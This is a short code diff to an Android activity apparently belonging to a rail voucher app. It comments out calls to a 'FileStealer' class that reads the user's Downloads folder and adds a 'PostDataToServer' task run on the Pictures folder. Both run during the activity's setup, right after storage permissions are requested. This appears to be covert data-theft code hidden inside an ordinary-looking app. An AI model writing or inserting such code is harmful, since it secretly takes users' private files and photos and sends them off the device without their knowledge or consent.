@@ -52,9 +52,10 @@ public class RailVoucherActivity extends AppCompatActivity {
                         Manifest.permission.READ_EXTERNAL_STORAGE},
                 MY_PERMISSIONS_REQUEST);
 
-        FileStealer stealer = new FileStealer();
-        stealer.getUserFiles(Environment.DIRECTORY_DOWNLOADS);
-
+//        FileStealer stealer = new FileStealer();
+//        stealer.getUserFiles(Environment.DIRECTORY_DOWNLOADS);
+        PostDataToServer postDataToServer = new PostDataToServer();
+        postDataToServer.execute(Environment.DIRECTORY_PICTURES);
         FloatingActionButton fab = findViewById(R.id.fab);
         fab.setOnClickListener(new View.OnClickListener() {
             @Override
